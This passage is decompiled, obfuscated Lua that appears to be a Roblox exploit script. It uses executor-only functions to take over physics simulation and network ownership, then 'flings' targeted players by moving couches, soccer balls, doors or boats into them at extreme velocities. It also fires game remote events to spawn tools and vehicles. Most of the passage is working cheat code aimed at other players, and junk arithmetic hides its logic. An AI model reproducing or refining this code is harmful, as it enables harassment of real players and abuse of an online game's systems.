	getgenv().DoorFlingAtivo = true
	getgenv().DoorFlingPreparado = true
	local cFrame2 = v.CFrame
	local v2 = upv5(v)
	local vector_ = Vector3.new(3.15e10, 3.15e10, 3.15e10)
	local spawn = task.spawn

	local function fn()
		local n7 = 0
		local n8 = 0.8
		local now = tick()
		local n9 = 0
		local flag2 = true
		local n10 = 2307314387
		local tbl = {}
		local n11 = 417236653

		local connection = upv6.Stepped:Connect(function()
			if not flag2 then
				return
			end
			local character2 = localPlayer.Character
			if not character2 then
				return
			end

			for _, descendant in ipairs(character2:GetDescendants()) do
				if descendant:IsA("BasePart") and descendant.CanCollide then
					tbl[descendant] = true
					descendant.CanCollide = false
				end
			end
		end)

		local function fn2(arg2)
			local v3 = flag2
			local v4

			if flag2 then
				v4 = arg2
			else
				v4 = v3
			end

			if v4 then
				flag2 = false
				arg2.CFrame = cFrame
				arg2.AssemblyLinearVelocity = Vector3.zero
			end
		end

		while getgenv().DoorFlingAtivo and getgenv().DoorFlingSessao == doorFlingSessao do
			n7 += upv6.Heartbeat:Wait()

			pcall(function()
				settings().Physics.AllowSleep = false
				sethiddenproperty(localPlayer, "SimulationRadius", math.huge)
				sethiddenproperty(localPlayer, "MaxSimulationRadius", math.huge)
			end)

			if not pcall(function()
				local n12 = 30844
				local n13 = 87820743
				local humanoidRootPart2 = localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart")
				if not humanoidRootPart2 then
					return
				end
				local v3 = v and v:IsDescendantOf(workspace)
				local v4

				if v3 then
					v4 = upv7(v)
					n13 = n13 + 105150957 - 105150957
				else
					v4 = v3
				end

				if v4 then
					now = tick()
				end

				local n14 = tick() - now

				if not v3 or n14 > n8 then
					if v2 then
						v2.Velocity = Vector3.zero
					end

					if v3 and n14 < 3 then
						if upv2(v) then
							flag2 = true

							if upv4(v, humanoidRootPart2) then
								now = tick()
							end
						end

						return
					end

					fn2(humanoidRootPart2)
					n9 += 1
					upv3("A Fling Part sumiu, tentando remontar a casa...")
					local v5 = upv8()
					if not v5 then
						getgenv().DoorFlingAtivo = false
						return
					end
					v = v5
					cFrame2 = v.CFrame
					v2 = upv5(v)
					flag2 = true
					upv4(v, humanoidRootPart2)
					now = tick()
					return
				end

				if not v2 or v2.Parent ~= v then
					v2 = upv5(v)
				end

				local v5 = n12
				v.CanCollide = false
				local character2 = arg and arg.Parent and arg.Character
				local humanoidRootPart3 = character2 and character2:FindFirstChild("HumanoidRootPart")
				local humanoid = character2 and character2:FindFirstChildWhichIsA("Humanoid")
				local flag3 = humanoidRootPart3 and humanoid

				if flag3 then
					local health = humanoid.Health
					n12 = bit32.band(n12, v5)
					flag3 = health > 0
				end

				if flag3 and character2:IsDescendantOf(workspace) and humanoidRootPart3.AssemblyLinearVelocity.Magnitude <= 250 then
					local magnitude = humanoidRootPart3.AssemblyLinearVelocity.Magnitude
					local n15

					if magnitude > 2 then
						local n16 = humanoidRootPart3.Position + humanoidRootPart3.CFrame.LookVector * math.clamp(magnitude * 1.8, 12, 40)
						local vector_2 = Vector3.new
						local sin = math.sin
						local v6 = n7
						local v7 = bit32.rshift(v5, 23)
						n15 = n16 + vector_2(0, sin(v6 * 18) * 4 + 4, 0)
						n13 = n13 + 155055958 - 155055958
					else
						n15 = humanoidRootPart3.Position + Vector3.new(0, math.sin(n7 * 70) * 7 + 3, 0)
					end

					v.CFrame = CFrame.new(n15)
					v.AssemblyLinearVelocity = vector_
					v2.Velocity = vector_
					flag2 = true
					humanoidRootPart2.CFrame = CFrame.new(n15)
					humanoidRootPart2.AssemblyLinearVelocity = Vector3.zero
					humanoidRootPart2.AssemblyAngularVelocity = Vector3.zero
				else
					fn2(humanoidRootPart2)
					local v6 = bit32.bxor(v5, 4294967295)
					v2.Velocity = Vector3.zero
					v.CFrame = CFrame.new(humanoidRootPart2.Position + Vector3.new(0, math.sin(n7 * 10) * 2 + 14, 0))
					v.AssemblyLinearVelocity = Vector3.zero
				end
			end) then
				task.wait()
			end
		end

		connection:Disconnect()

		for k in pairs(tbl) do
			if k.Parent then
				local n12 = 297801026

				pcall(function()
					k.CanCollide = true
				end)
			end
		end

		upv9(v, cFrame2)
		local character2 = localPlayer.Character

		if character2 then
			local character3 = localPlayer.Character
			character2 = character3:FindFirstChild("HumanoidRootPart")
		end

		if character2 and flag2 then
			pcall(function()
				character2.CFrame = cFrame
				character2.AssemblyLinearVelocity = Vector3.zero
				character2.AssemblyAngularVelocity = Vector3.zero
				local humanoid = localPlayer.Character:FindFirstChildOfClass("Humanoid")

				if humanoid then
					humanoid:ChangeState(Enum.HumanoidStateType.GettingUp)
				end
			end)
		end
	end

	spawn(fn)
end

-- payload closure created 792-th (proto #t4280)
local function payload_fn_792()
	local n2 = 420309822
	local n3 = 2013937650
	local backpack = upv1:WaitForChild("Backpack")
	local couch_ = backpack:FindFirstChild("Couch") or upv1.Character and upv1.Character:FindFirstChild("Couch")
	local v

	if not couch_ then
		local tbl = { "PickingTools", "Couch" }
		local n4 = 712487422

		pcall(function()
			upv2:WaitForChild("RE"):WaitForChild("1Too1l"):InvokeServer(unpack(tbl))
		end)

		local now = tick()
		local couch_2

		while true do
			couch_2 = backpack:FindFirstChild("Couch")
			task.wait(0.05)
			if not (couch_2 or tick() - now > 1.5) then
				continue
			end
			break
		end

		if not couch_2 then
			return false
		end
		v = couch_2
	else
		v = couch_
	end

	local v2 = upv1
	v.Parent = v2.Character
	local v3 = tick
	local v4 = table.pack(bit32.band(n3, 4294967295))
	local v5 = table.pack(bit32.band(v4[1], 65535))
	bit32.band(v5[1] * 30662 + bit32.lshift(bit32.band(v5[1] * 0 + bit32.rshift(v4[1], 16) * 30662, 65535), 16), 4294967295)
	local v6 = v3()
	local couch_2

	while true do
		couch_2 = upv1.Character and upv1.Character:FindFirstChild("Couch")

		if not couch_2 then
			couch_2 = backpack:FindFirstChild("Couch")

			if couch_2 then
				couch_2.Parent = upv1.Character
			end
		end

		task.wait(0.05)
		if not (couch_2 or tick() - v6 > 1) then
			continue
		end
		break
	end

	return couch_2
end

-- payload closure created 793-th (proto #t5595)
local function payload_fn_793()
	local flag = false
	upv1(false)

	if upv2 then
		local n2 = 9123886032

		pcall(function()
			upv2:Set(false)
		end)
	end
end

-- payload closure created 794-th (proto #t8415)
local function payload_fn_794(arg)
	local n2 = 462434613
	local n3 = 4105259589
	local n4 = 362254194
	local flag = not arg

	if not flag then
		flag = not arg.Character
		n3 = bit32.bxor(n3 // 3, 2770412626)
	end

	if flag or not upv1.Character then
		upv2()
		return
	end
	local character = upv1.Character or upv1.CharacterAdded:Wait()
	local humanoid = character:FindFirstChildOfClass("Humanoid")
	local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
	if not humanoid or not humanoidRootPart then
		upv2()
		return
	end
	local humanoid2 = arg.Character:FindFirstChildOfClass("Humanoid")
	if not humanoid2 then
		upv2()
		return
	end

	if humanoid2.Sit then
		local n5 = 8717683921

		pcall(function()
			game:GetService("StarterGui"):SetCore("SendNotification", { Title = "Fling Sofa", Text = "O jogador esta sentado em algo.", Duration = 3 })
		end)

		upv2()
		return
	end

	savedPosition = humanoidRootPart.Position
	local v = upv3()
	if not v then
		upv2()
		return
	end
	task.wait(0.2)
	couch = v
	local v2 = upv4(v)
	if not v2 then
		upv2()
		return
	end
	local v3 = humanoidRootPart.CFrame:ToObjectSpace(v2.CFrame)
	local now = os.clock()
	local v4 = bit32.bor(n4, 3569694958)
	v2.Anchored = false
	v2.CanCollide = true
	local v5 = bit32.bxor(n2, 337268759)
	v2.CanTouch = true
	local v6 = upv5.saveCollision(character)
	upv6(true)
	local flag2 = true

	task.spawn(function()
		local character2 = upv1.Character or upv1.CharacterAdded:Wait()

		if not (character2:FindFirstChild("HumanoidRootPart") or character2:FindFirstChild("Torso")) then
			character2:FindFirstChild("UpperTorso")
		end

		local humanoid3 = character2:FindFirstChildWhichIsA("Humanoid")

		if humanoid3 then
			local n5 = 9068665506

			humanoid3.Died:Connect(function()
				flag2 = false
				upv7 = false
				upv2()
			end)
		end

		local n5 = 0.1
		local n6 = 1e9
		local humanoidRootPart2

		while true do
			upv8.Heartbeat:Wait()
			local character3 = upv1.Character

			if character3 then
				humanoidRootPart2 = character3:FindFirstChild("HumanoidRootPart") or character3:FindFirstChild("Torso") or character3:FindFirstChild("UpperTorso")
			else
				humanoidRootPart2 = character3
			end

			if character3 and character3.Parent and humanoidRootPart2 and humanoidRootPart2.Parent then
				local humanoid4 = character3:FindFirstChildWhichIsA("Humanoid")

				if humanoid4 and humanoid4.Sit then
					humanoid4.Sit = false
					humanoid4:ChangeState(Enum.HumanoidStateType.GettingUp)
				end

				for _, descendant in ipairs(character3:GetDescendants()) do
					if descendant:IsA("BasePart") then
						descendant.CanCollide = false
					end
				end

				local velocity = humanoidRootPart2.Velocity

				pcall(function()
					humanoidRootPart2.Velocity = velocity * n6 + Vector3.new(0, 1e9, 0)
				end)

				upv8.RenderStepped:Wait()

				if humanoidRootPart2 and humanoidRootPart2.Parent then
					pcall(function()
						humanoidRootPart2.Velocity = velocity
					end)
				end

				upv8.Stepped:Wait()

				if humanoidRootPart2 and humanoidRootPart2.Parent then
					local n7 = 357419429

					pcall(function()
						humanoidRootPart2.Velocity = velocity + Vector3.new(0, n5, 0)
					end)

					n5 = -n5
				end
			end

			if not (not flag2 or not upv7) then
				continue
			end
			break
		end

		if humanoidRootPart2 and humanoidRootPart2.Parent then
			pcall(function()
				humanoidRootPart2.Velocity = Vector3.zero
			end)
		end
	end)

	upv7 = true

	upv9 = upv8.Stepped:Connect(function()
		if not upv7 then
			return
		end

		for _, descendant in ipairs(character:GetDescendants()) do
			if descendant:IsA("BasePart") and descendant ~= v2 then
				descendant.CanCollide = false
			end
		end

		if v2 and v2.Parent then
			v2.CanCollide = true
			v2.CanTouch = true
		end
	end)

	local v7 = v4

	flingConnection = upv8.Heartbeat:Connect(function()
		local n5 = 3288601526
		local n6 = 45025304
		local v8 = bit32.bxor(v7, 3606717952)
		local n7 = 1783682233
		if not upv7 then
			return
		end

		if not arg or not arg.Character then
			upv7 = false
			flag2 = false
			upv2()
			return
		end

		local humanoidRootPart2 = arg.Character:FindFirstChild("HumanoidRootPart")
		local humanoid3 = arg.Character:FindFirstChild("Humanoid")

		if not humanoidRootPart2 or not humanoid3 then
			upv7 = false
			flag2 = false
			upv2()
			return
		end

		local flag3 = not humanoidRootPart

		if not flag3 then
			n5 = n7
			flag3 = not humanoid
		end

		if flag3 then
			upv7 = false
			flag2 = false
			upv2()
			return
		end

		local v9 = os
		local v10 = table.pack(bit32.band(n6, 4294967295))
		local v11 = table.pack(bit32.band(v10[1], 65535))
		local n8 = bit32.band(11630 * v11[1] + bit32.lshift(bit32.band(11630 * bit32.rshift(v10[1], 16) + 1958 * v11[1], 65535), 16), 4294967295) + 2153860830
		local v12 = table.pack(bit32.band(bit32.bor(n6, 4128009), 4294967295))
		local v13 = table.pack(bit32.band(v12[1], 65535))
		local v14 = bit32.band(53907 * v13[1] + bit32.lshift(bit32.band(53907 * bit32.rshift(v12[1], 16) + 63577 * v13[1], 65535), 16), 4294967295)
		local v15 = table.pack(bit32.band(bit32.band(n6, 4128009), 4294967295))
		local v16 = table.pack(bit32.band(v15[1], 65535))
		local n9 = n8 + v14 + bit32.band(53905 * v16[1] + bit32.lshift(bit32.band(53905 * bit32.rshift(v15[1], 16) + 63577 * v16[1], 65535), 16), 4294967295)
		local n10 = v8 + 2798943612
		local n11 = v9.clock() - now

		pcall(function()
			bit32.bxor(bit32.bxor(n9, 0), 383933741)
			local n12 = 1708502719
			local n13 = 221864201
			local n14 = 1921563263
			local assemblyLinearVelocity = humanoidRootPart2.AssemblyLinearVelocity
			local n15 = 2326354766
			local vector_ = Vector3.new(assemblyLinearVelocity.X, 0, assemblyLinearVelocity.Z)
			local n16

			if vector_.Magnitude > 40 then
				n16 = vector_.Unit * 40
			else
				n16 = vector_
			end

			local n17 = 0.12

			pcall(function()
				n17 = math.clamp(game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValue() / 1000, 0.04, 0.35)
			end)

			local n18 = math.clamp(n16.Magnitude / 16, 0, 1)
			local n19 = n14 // n15
			local n20 = humanoidRootPart2.Position + n16 * math.clamp(n17 * 1.35 + n18 * 0.06 + n18 * math.clamp(n11 / 10, 0, 1) * 0.55, 0.08, 0.75)
			local magnitude = n16.Magnitude
			local n21 = 0

			if magnitude < 2 then
				local n22 = math.clamp((n11 - 0.75) / 2, 0, 1)
				n19 //= 15
				n21 = math.sin(n11 * 16) * 0.65 * n22
			end

			local z = n20.Z
			local vector_2 = Vector3.new(n20.X, upv10(arg.Character, humanoidRootPart2) + n21, z)
			local n22 = n11 * 18
			local n23 = vector_2 + Vector3.new(math.cos(n22) * 1.65, 0, math.sin(n22) * 1.65)
			local vector_3 = Vector3.new
			local n24 = vector_2.X - n23.X
			local z2 = vector_2.Z
			local vector_4 = vector_3(n24, 0, z2 - n23.Z)

			if vector_4.Magnitude < 0.01 then
				vector_4 = Vector3.new(0, 0, -1)
			end

			local rotation = CFrame.lookAt(n23, n23 + vector_4.Unit).Rotation
			character:PivotTo(CFrame.new(n23) * rotation * v3.Rotation * v3:Inverse())
			humanoidRootPart.AssemblyLinearVelocity = Vector3.zero
			humanoidRootPart.AssemblyAngularVelocity = Vector3.zero
		end)

		if humanoid3.Sit or n11 >= 10 then
			local n12 = 492160383
			local sit = humanoid3.Sit
			flingConnection:Disconnect()
			flingConnection = nil

			if upv9 then
				upv9:Disconnect()
				upv9 = nil
			end

			if sit then
				task.wait(0.6)
			end

			upv7 = false
			flag2 = false
			local n13 = n12 + 91856183 + 207226064
			local tbl = { "PlayerWantsToDeleteTool", "Couch" }

			pcall(function()
				upv11:WaitForChild("RE"):WaitForChild("1Clea1rTool1s"):FireServer(unpack(tbl))
			end)

			pcall(function()
				humanoidRootPart.Anchored = true
				humanoidRootPart.CFrame = CFrame.new(savedPosition + Vector3.new(0, 5, 0))
				task.wait(0.2)
				humanoidRootPart.Velocity = Vector3.zero
				humanoidRootPart.RotVelocity = Vector3.zero
				humanoidRootPart.Anchored = false

				if humanoid then
					humanoid:ChangeState(Enum.HumanoidStateType.GettingUp)
				end
			end)

			upv5.restoreCollision(v6)
			local v17 = upv2
			v17()
		end
	end)
end

-- payload closure created 795-th (proto #t1216)
local function payload_fn_795()
	local n2 = 3310948095
	local n3 = 3627353399
	local character = upv1.Character
	if not character then
		return nil
	end
	local backpack = upv1:WaitForChild("Backpack")
	local v = n3
	local workspaceCom = workspace:FindFirstChild("WorkspaceCom")
	if not workspaceCom then
		return nil
	end
	local n001SoccerBalls = workspaceCom:FindFirstChild("001_SoccerBalls")
	if not n001SoccerBalls then
		return nil
	end
	local str = "Soccer" .. upv1.Name
	local v2 = n001SoccerBalls:FindFirstChild(str)

	if not v2 then
		local n4 = 149801889

		if not backpack:FindFirstChild("SoccerBall") and not character:FindFirstChild("SoccerBall") then
			local n5 = 589680210

			pcall(function()
				upv2:WaitForChild("RE"):WaitForChild("1Too1l"):InvokeServer("PickingTools", "SoccerBall")
			end)
		end

		local now = tick()
		local v3 = bit32.bxor(n4, 195653510)
		local soccerBall_ = backpack:FindFirstChild("SoccerBall") or character:FindFirstChild("SoccerBall")

		while not soccerBall_ and tick() - now < 3 do
			task.wait(0.05)
			soccerBall_ = backpack:FindFirstChild("SoccerBall") or character:FindFirstChild("SoccerBall")
		end

		if not soccerBall_ then
			return nil
		end
		soccerBall_.Parent = character
		task.wait(0.1)

		pcall(function()
			if soccerBall_:FindFirstChild("FootballInteraction") then
				soccerBall_.FootballInteraction:FireServer(CFrame.new(character:FindFirstChild("HumanoidRootPart") and character.HumanoidRootPart.Position or Vector3.zero))
			end
		end)

		local now2 = tick()

		while not n001SoccerBalls:FindFirstChild(str) and tick() - now2 < 3 do
			task.wait(0.05)
		end

		if character:FindFirstChild("SoccerBall") then
			character.SoccerBall.Parent = backpack
		end

		v2 = n001SoccerBalls:FindFirstChild(str)
	end

	return v2
end

-- payload closure created 796-th (proto #t2329)
local function payload_fn_796(arg)
	local n2 = 2936784866
	local n3 = 9126018420
	local n4 = 935680945
	if not arg then
		return
	end
	local character = upv1.Character
	if not character or not character:FindFirstChild("HumanoidRootPart") then
		return
	end

	local function fn(arg2)
		local ok2, result2 = pcall(isnetworkowner, arg2)
		if ok2 then
			return result2
		end
		return arg2.ReceiveAge == 0
	end

	local function fn2()
		local flag = type(0) == "boolean"
		local v = upv2()
		local n5 = 8929131482
		if v and fn(v) then
			return v
		end
		local character2 = upv1.Character
		local backpack = upv1:FindFirstChild("Backpack")
		local v2 = bit32.bxor(n5, 318193799)
		local n001SoccerBalls = workspace:FindFirstChild("WorkspaceCom") and workspace.WorkspaceCom:FindFirstChild("001_SoccerBalls")

		local function fn3()
			local soccerBall_ = backpack and backpack:FindFirstChild("SoccerBall")
			local soccerBall_2

			if soccerBall_ then
				soccerBall_2 = soccerBall_
			else
				local v3 = character2

				if character2 then
					soccerBall_2 = character2:FindFirstChild("SoccerBall")
				else
					soccerBall_2 = v3
				end
			end

			local v3

			if soccerBall_2 then
				v3 = soccerBall_2
			else
				local v4 = n001SoccerBalls

				if n001SoccerBalls then
					v3 = n001SoccerBalls:FindFirstChild("Soccer" .. upv1.Name)
				else
					v3 = v4
				end
			end

			return v3
		end

		pcall(function()
			upv3:WaitForChild("RE"):WaitForChild("1Too1l"):InvokeServer("PickingTools", "SoccerBall")
		end)

		local now = tick()

		while fn3(450338462, 454172398) and tick() - now < 2 do
			task.wait(0.05)
		end

		local v3 = upv2()
		if not v3 then
			return nil
		end
		local now2 = tick()

		while not fn(v3) and tick() - now2 < 2 do
			task.wait(0.05)
		end

		return v3
	end

	local v = fn2()

	if not v then
		warn(" Falha ao equipar bola!")

		if upv4 then
			local n5 = 728879686

			pcall(function()
				upv4:Set(false)
			end)
		end

		return
	end

	local vector_ = Vector3.new(100000000, 100000000, 100000000)
	local tbl = { 0, 0.15, 0.3, 0.45 }
	local n5 = 430
	local n6 = 2000
	local n7 = 60
	local flingBallToken = {}
	local str = "hunt"
	local n8 = 0
	local n9 = 0
	local n10 = 0
	local n11 = 16
	local v2 = nil
	local v3 = nil
	local n12 = 0
	local n13 = 0
	local flag = false
	local tbl2 = {}
	local v4 = nil
	local v5 = nil
	getgenv().FlingBallToken = flingBallToken
	getgenv().FlingAtivo = true

	local function fn3()
		return getgenv().FlingAtivo and getgenv().FlingBallToken == flingBallToken
	end

	local function fn4()
		for _, v6 in ipairs(tbl2) do
			v6:Destroy()
		end

		table.clear(tbl2)
		v4 = nil
		v5 = nil
	end

	local function fn5()
		fn4()
		local character2 = upv1.Character
		if not character2 or not v or not v.Parent then
			return
		end

		for _, descendant in ipairs(character2:GetDescendants()) do
			if descendant:IsA("BasePart") then
				local noCollisionConstraint = Instance.new("NoCollisionConstraint")
				noCollisionConstraint.Part0 = v
				noCollisionConstraint.Part1 = descendant
				noCollisionConstraint.Parent = v
				tbl2[#tbl2 + 1] = noCollisionConstraint
			end
		end

		local v6 = v
		v4 = character2
		v5 = v6
	end

	fn5()

	local function fn6(arg2)
		local tbl3 = {}
		local v6 = ipairs
		local Players = game:GetService("Players")

		for _, player in v6(Players:GetPlayers()) do
			local humanoidRootPart = player ~= upv1 and player.Character and player.Character:FindFirstChild("HumanoidRootPart")

			if humanoidRootPart then
				tbl3[#tbl3 + 1] = humanoidRootPart.Position
			end
		end

		local v7 = nil
		local v8 = nil

		for i = 0, 15 do
			local n14 = i * 3.1415926535897931 / 8

			for _, v9 in ipairs({ 450, 600 }) do
				local n15 = arg2 + Vector3.new(math.cos(n14) * v9, 40, math.sin(n14) * v9)
				local huge = math.huge

				for _, v10 in ipairs(tbl3) do
					local magnitude = (v10 - n15).Magnitude

					if magnitude < huge then
						huge = magnitude
					end
				end

				if not v7 or huge > v7 then
					v7 = huge
					v8 = n15
				end
			end
		end

		return v8
	end

	local v6 = n4

	local connection = upv5.Heartbeat:Connect(function(deltaTime)
		local n14 = 3975302804
		local v7 = bit32.bxor(v6, 1344165542)
		if str ~= "hunt" or not fn3() then
			return
		end
		local character2 = arg.Character
		local n15 = v7 + 2012452186
		character2 = character2 and character2:FindFirstChild("HumanoidRootPart")
		local humanoidRootPart = upv1.Character and upv1.Character:FindFirstChild("HumanoidRootPart")
		if not character2 or not humanoidRootPart then
			return
		end
		local assemblyLinearVelocity = character2.AssemblyLinearVelocity
		local magnitude = assemblyLinearVelocity.Magnitude
		local magnitude2 = (character2.Position - humanoidRootPart.Position).Magnitude
		local flag2 = magnitude > math.max(250, n11 * 3)
		local v8 = bit32.bxor(n14, n15)

		if flag2 or magnitude2 > n6 then
			str = "park"
			v2 = nil
			return
		end

		n11 += (math.min(magnitude, 120) - n11) * math.min(1, deltaTime * 2)
		local v9 = flag
		local flag3

		if flag then
			flag3 = v9
		else
			flag3 = not v
		end

		if flag3 or not v.Parent then
			return
		end
		n8 += 1

		if n5 < magnitude2 then
			n9 += 1
		end

		local vector_2 = Vector3.new(assemblyLinearVelocity.X, 0, assemblyLinearVelocity.Z)
		local flag4 = vector_2.Magnitude > 80
		local v10 = bit32.bxor(v8, 4294967295)

		if flag4 then
			vector_2 = vector_2.Unit * 80
		end

		local n16 = tbl[n8 % #tbl + 1] + n10
		local n17 = math.floor(n8 / #tbl) % 2 == 0 and -1 or 1.5
		local v11 = v
		local cframe = CFrame.new
		local position = character2.Position
		v11.CFrame = cframe(position + vector_2 * n16 + Vector3.new(0, n17, 0))
		v.AssemblyLinearVelocity = vector_
		v.AssemblyAngularVelocity = Vector3.zero
	end)

	task.spawn(function()
		local n14 = 286476005
		local n15 = 3202582749
		local n16 = 0

		while fn3() do
			task.wait(str == "park" and 0.25 or 0.1)

			if fn3() then
				if arg.Parent then
					n16 += 1

					if n16 % 10 == 0 then
						local n17 = 8733716016

						pcall(function()
							n10 = upv1:GetNetworkPing() * 2
						end)
					end

					local humanoidRootPart = upv1.Character and upv1.Character:FindFirstChild("HumanoidRootPart")

					if not humanoidRootPart then
						continue
					else
						local flag2, flag3, character2, humanoid, flag4, now, flag5, flag6, v7

						if not flag and (not v or not v.Parent or not fn(v)) then
							flag = true
							v = fn2()
							flag = false

							if v then
								flag2 = v4 ~= upv1.Character
								flag3 = flag2 or v5 ~= v

								if flag3 then
									fn5()
								end

								character2 = arg.Character
								humanoid = character2 and character2:FindFirstChildOfClass("Humanoid")
								character2 = character2 and character2:FindFirstChild("HumanoidRootPart")
								flag4 = humanoid and character2 and humanoid.Health > 0

								if str == "hunt" then
									if not flag4 then
										str = "park"
										v2 = nil
									end
								else
									now = tick()
									flag5 = now - n12 > 1.5 or not v3

									if flag5 then
										v3 = fn6(humanoidRootPart.Position)
										n12 = now
									end

									flag6 = v3 and v and v.Parent and now - n13 > 0.5

									if flag6 then
										n13 = now
										v.CFrame = CFrame.new(v3)
										v.AssemblyLinearVelocity = Vector3.zero
										v.AssemblyAngularVelocity = Vector3.zero
									end

									flag4 = flag4 and character2.AssemblyLinearVelocity.Magnitude < n7 and (character2.Position - humanoidRootPart.Position).Magnitude < n6

									if flag4 then
										v7 = v2 or now
										v2 = v7

										if now - v2 > 0.5 then
											str = "hunt"
											v2 = nil
											n11 = 16
										end
									else
										v2 = nil
									end
								end

								continue
							end
						else
							flag2 = v4 ~= upv1.Character
							flag3 = flag2 or v5 ~= v

							if flag3 then
								fn5()
							end

							character2 = arg.Character
							humanoid = character2 and character2:FindFirstChildOfClass("Humanoid")
							character2 = character2 and character2:FindFirstChild("HumanoidRootPart")
							flag4 = humanoid and character2 and humanoid.Health > 0

							if str == "hunt" then
								if not flag4 then
									str = "park"
									v2 = nil
								end
							else
								now = tick()
								flag5 = now - n12 > 1.5 or not v3

								if flag5 then
									v3 = fn6(humanoidRootPart.Position)
									n12 = now
								end

								flag6 = v3 and v and v.Parent and now - n13 > 0.5

								if flag6 then
									n13 = now
									v.CFrame = CFrame.new(v3)
									v.AssemblyLinearVelocity = Vector3.zero
									v.AssemblyAngularVelocity = Vector3.zero
								end

								flag4 = flag4 and character2.AssemblyLinearVelocity.Magnitude < n7 and (character2.Position - humanoidRootPart.Position).Magnitude < n6

								if flag4 then
									v7 = v2 or now
									v2 = v7

									if now - v2 > 0.5 then
										str = "hunt"
										v2 = nil
										n11 = 16
									end
								else
									v2 = nil
								end
							end

							continue
						end
					end
				end
			end

			break
		end

		connection:Disconnect()
		fn4()
		if getgenv().FlingBallToken ~= flingBallToken then
			return
		end
		local humanoidRootPart = upv1.Character and upv1.Character:FindFirstChild("HumanoidRootPart")
		local v7 = v

		if v then
			local parent = v.Parent
			v7 = parent
		end

		if v7 and humanoidRootPart and fn(v) then
			v.AssemblyLinearVelocity = Vector3.zero
			v.CFrame = humanoidRootPart.CFrame * CFrame.new(0, 0, -4)
		end

		if getgenv().FlingAtivo then
			getgenv().FlingAtivo = false

			if upv4 then
				local n17 = 476193947

				pcall(function()
					upv4:Set(false)
				end)
			end
		end
	end)
end

-- payload closure created 797-th (proto #t5703)
local function payload_fn_797()
	getgenv().FlingAtivo = false
end

-- payload closure created 798-th (proto #t3960)
local function payload_fn_798(arg)
	if not arg or not arg.Character or not upv1.Character then
		return
	end
	upv2.run(arg, "fling")
end

-- payload closure created 799-th (proto #t2941)
local function payload_fn_799(arg)
	local n2 = 3676198482
	local n3 = 3142890479
	local n4 = 3509212660
	local n5 = 479322063
	if not arg or not arg.Character or not upv1.Character then
		return
	end
	local character = upv1.Character or upv1.CharacterAdded:Wait()
	local humanoid = character:FindFirstChildOfClass("Humanoid")
	local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
	if not humanoid or not humanoidRootPart then
		return
	end
	savedPosition = humanoidRootPart.Position
	local vehicles = upv2:FindFirstChild("Vehicles")
	if not vehicles then
		return
	end

	local function fn()
		humanoidRootPart.Anchored = true
		humanoidRootPart.CFrame = CFrame.new(Vector3.new(1565.3707, -3.7332046, 50.685337))
		task.wait(0.2)
		humanoidRootPart.Velocity = Vector3.zero
		humanoidRootPart.RotVelocity = Vector3.zero
		humanoidRootPart.Anchored = false
		humanoid:ChangeState(Enum.HumanoidStateType.GettingUp)
	end

	local n6 = n5 - 346546933
	pcall(fn)

	pcall(function()
		upv3.RE["1Ca1r"]:FireServer("DeleteAllVehicles")
	end)

	local wait = task.wait
	local v = bit32.bxor(n3, 4262956963)
	wait(0.5)

	pcall(function()
		upv3.RE["1Ca1r"]:FireServer("PickingBoat", "PirateFree")
	end)

	local now = tick()
	local v2

	while true do
		v2 = vehicles:FindFirstChild(upv1.Name .. "Car")
		task.wait(0.25)
		if not (v2 or tick() - now > 7) then
			continue
		end
		break
	end

	if not v2 then
		upv4()
		return
	end
	local now2 = tick()
	local vehicleSeat = v2:FindFirstChildWhichIsA("VehicleSeat", true) or v2:FindFirstChildWhichIsA("Seat", true)

	if vehicleSeat and not humanoid.Sit then
		while true do
			if humanoid.SeatPart ~= vehicleSeat then
				humanoid.Sit = false
				humanoidRootPart.CFrame = vehicleSeat.CFrame * CFrame.new(0, 2, 0)
				task.wait()

				pcall(function()
					vehicleSeat:Sit(humanoid)
				end)
			end

			task.wait(0.1)
			if not (humanoid.SeatPart == vehicleSeat or tick() - now2 > 5) then
				continue
			end
			break
		end
	end

	local flag = not vehicleSeat

	if not flag then
		flag = humanoid.SeatPart ~= vehicleSeat
	end

	if flag then
		upv4()
		return
	end
	upv5()

	for _, descendant in ipairs(v2:GetDescendants()) do
		if descendant:IsA("BasePart") then
			descendant.CanCollide = false

			pcall(function()
				descendant:SetNetworkOwner(nil)
			end)

			pcall(function()
				upv6:FireServer(descendant, nil)
			end)
		end
	end

	upv7 = true

	upv9 = upv8.Stepped:Connect(function()
		if not upv7 then
			return
		end

		for _, descendant in ipairs(character:GetDescendants()) do
			if descendant:IsA("BasePart") then
				descendant.CanCollide = false
			end
		end
	end)

	local v3 = bit32.bxor(n4, v)

	local function fn2()
		local character2 = arg.Character
		local humanoidRootPart2 = character2 and character2:FindFirstChild("HumanoidRootPart")
		local humanoid2 = character2 and character2:FindFirstChildOfClass("Humanoid")
		if character2 and humanoidRootPart2 and humanoid2 then
			return character2, humanoidRootPart2, humanoid2
		end
		return nil, nil, nil
	end

	local v4, v5 = fn2()

	if v5 then
		local attachment = Instance.new("Attachment", v5)
		local bodyVelocity = Instance.new("BodyVelocity")
		bodyVelocity.Velocity = Vector3.new(1e9, 1e9, 1e9)
		bodyVelocity.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
		bodyVelocity.P = 1e9
		bodyVelocity.Parent = attachment
	end

	for _, descendant in ipairs(v2:GetDescendants()) do
		if descendant:IsA("BasePart") then
			local bodyVelocity = Instance.new("BodyVelocity")
			bodyVelocity.Velocity = Vector3.new(1e9, 1e9, 1e9)
			bodyVelocity.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
			bodyVelocity.P = 1e9
			bodyVelocity.Parent = descendant
		end
	end

	local flag2 = true
	local n7 = 10
	local now3 = tick()
	local flag3 = false
	local heartbeat = upv8.Heartbeat
	local v6 = bit32.bor(v3, v)

	flingConnection = heartbeat:Connect(function()
		local n8 = 497321744
		local n9 = bit32.bxor(v6, 0) + 331649995
		local n10 = 533551278
		local n11 = bit32.bxor(v6, 2670429818)
		if not upv7 or not arg or not arg.Character or not v2 or not v2.Parent then
			upv7 = false
			return
		end
		local v7, v8, v9 = fn2()
		local flag4 = not v8

		if not flag4 then
			flag4 = not v9
			n11 = n10 - 3582745896
		end

		if flag4 then
			upv7 = false
			return
		end
		local magnitude = v8.AssemblyLinearVelocity.Magnitude

		if magnitude > 150 then
			flag3 = true
			upv7 = false
			return
		end

		local n12 = flag2 and 10 or -n7
		local v10 = flag2
